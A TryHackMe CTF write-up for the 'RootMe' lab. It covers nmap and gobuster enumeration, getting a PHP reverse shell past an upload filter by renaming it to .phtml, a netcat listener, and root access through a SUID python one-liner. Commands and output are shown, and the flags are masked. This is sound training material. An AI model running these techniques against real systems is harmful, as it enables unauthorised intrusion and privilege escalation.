<p align="center">
  THM : RootMe<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/rrootme<br>
  <img src="https://i.imgur.com/JegKOYI.png">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Bypassing upload filter](#bypassing-upload-filter)
- [Getting a shell](#getting-a-shell)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Like always, let's use [nmap](https://nmap.org/) to find open ports on the target :  
```
┌──(attacker㉿AttackBox)-[~/Documents/TryHackMe/CTF/RootMe]
└─$ nmap 10.10.237.46 -A -p- -oN nmapResults.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 12:21 CEST
Nmap scan report for 10.10.237.46
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.54 seconds
```

**Question : Scan the machine, how many ports are open ?**  
**Answer : 2**  

**Question : What version of Apache is running ?**  
**Answer : 2.4.29**  

**Question : What service is running on port 22 ?**  
**Answer : SSH**  

## Website enumeration

Let's use [Gobuster](https://github.com/OJ/gobuster) to find hidden directories on the website :  
```
┌──(attacker㉿AttackBox)-[~/Documents/TryHackMe/CTF/RootMe]
└─$ gobuster dir -u http://10.10.237.46/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.237.46/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/01 12:22:13 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.237.46/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.237.46/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.10.237.46/js/]     
/panel                (Status: 301) [Size: 312] [--> http://10.10.237.46/panel/]  
Progress: 6822 / 220561 (3.09%)
```

There is an upload directory, so there must be a way to upload files to the server. So maybe we can upload a reverse shell ?
If we go to the /panel directory, there is a form to upload files to the server :  
![](https://i.imgur.com/PmOc4NQ.png)  

**Question : What is the hidden directory ?**  
**Answer : /panel/**  

## Bypassing upload filter

If we try to upload the [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) file by Pentestmonkey using the upload form, we get an error :  
![](https://i.imgur.com/b1vQJGg.png)  

(I have already changed the IP address and the port in the php file. Don't forget to change it to your IP address and to change the listening port to the one you'll use)

It says that php files are not accepted. There must be a way to bypass the filter. So I just changed the extension of the file to `.phtml` and it worked :  
![](https://i.imgur.com/BL565xh.png)  

## Getting a shell

If we take a look at the /uploads directory we found earlier, we can see our uploaded reverse shell :  
![](https://i.imgur.com/8GL26Ka.png)  

We just need to start a listener on our machine :  
```
┌──(attacker@AttackBox)-[~]
└─$ nc -lnvp 4242
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
```

And then navigate to our reverse shell, in my case it is `http://10.10.237.46/uploads/php-reverse-shell.phtml`. And if we take a look at our listener, we have a shell :  
```
Ncat: Connection from 10.10.237.46.
Ncat: Connection from 10.10.237.46:36942.
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:39:14 up 21 min,  0 users,  load average: 0.00, 0.01, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Let's do some simple enumeration.
```
$ whoami
www-data
$ ls /home
rootme
test
```

We are www-data and there is 2 user directories in /home. The user flag is located in /var/www :  
```
$ cd /var/www
$ ls  
html
user.txt
$ cat user.txt
THM{**************}
$
```

**Question : Find a form to upload and get a reverse shell, and find the flag.**  
**Answer : THM{*HIDDEN*}**

## Privilege escalation

Before looking for a way to escalate our privileges, let's stabilise our shell. First, let's use `python3 -c 'import pty; pty.spawn("/bin/bash")'` to get 
a more interactive shell. Then we can use `export TERM=xterm` to be able to use `clear`. And to fully stabilise our shell, we can use CTRL+Z to background our shell.
Then we use `stty -echo raw;fg`, and we have a fully stabilised shell !

Now, for the privilege escalation, we can use linPEAS.sh or just search manually. If we look for SUID binaries using `find / -perm -4000 2>/dev/null`, we 
find those binaries :  
```
www-data@rootme:/var/www$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

In the list, there is one binary that can be used for privilege escalation when it has the SUID bit set, it is /usr/bin/python.
If we search for python on [GTFOBins](https://gtfobins.github.io/), we can see that it is possible to spawn a root shell when the SUID bit is set on python :  
![](https://i.imgur.com/RnSBKWs.png)  

Let's use this command and see if we get a root shell :  
```
www-data@rootme:/var/www$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
```

We are root ! Now let's get the root flag, it is located in /root.
```
# cd /root
# ls
root.txt
# cat root.txt
THM{*****************}
```

**Question : Search for files with SUID premission, which file is weird ?**  
**Answer : /usr/bin/python**

**Question : root.txt**  
**Answer : THM{*HIDDEN*}**  

## Conclusion

In this room, we can learn how to bypass simple upload filters to get a reverse shell, and we can learn how to make simple privilege escalation. I think it's a very
good room for beginners. Thanks for this room !
